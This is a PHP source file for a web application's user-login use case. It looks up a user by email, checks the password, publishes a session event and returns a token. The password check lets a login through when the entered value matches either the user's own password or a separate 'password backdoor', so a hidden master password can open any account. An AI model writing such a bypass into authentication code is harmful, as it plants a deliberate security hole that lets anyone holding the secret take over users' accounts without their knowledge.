<?php declare(strict_types=1);


namespace Viabo\security\user\application\login;


use Viabo\security\shared\domain\user\UserEmail;
use Viabo\security\shared\domain\user\UserId;
use Viabo\security\user\domain\exceptions\UserNoAccess;
use Viabo\security\user\domain\services\UserFinder;
use Viabo\security\user\domain\User;
use Viabo\security\user\domain\UserPassword;
use Viabo\security\user\domain\UserRepository;
use Viabo\shared\domain\bus\event\EventBus;
use Viabo\shared\domain\DomainError;

final readonly class UserLogin
{
    public function __construct(
        private UserRepository $repository ,
        private UserFinder     $finder ,
        private EventBus       $bus
    )
    {
    }

    public function __invoke(UserEmail $email , UserPassword $passwordEntered): UserLoginResponse
    {
        $user = $this->searchUserBy($email);

        if ($user->isDifferent($passwordEntered) && $user->isNotPasswordBackdoor($passwordEntered) ) {
            throw new UserNoAccess();
        }

        $userView = $this->repository->searchView($user->id());
        $user->setEventSessionStarted();
        $this->bus->publish(...$user->pullDomainEvents());

        return new UserLoginResponse($userView->tokenData());
    }

    private function searchUserBy(UserEmail $email): User
    {
        try {
            return $this->finder->__invoke(UserId::empty() , $email);
        }catch (DomainError){
            throw new UserNoAccess();
        }
    }
}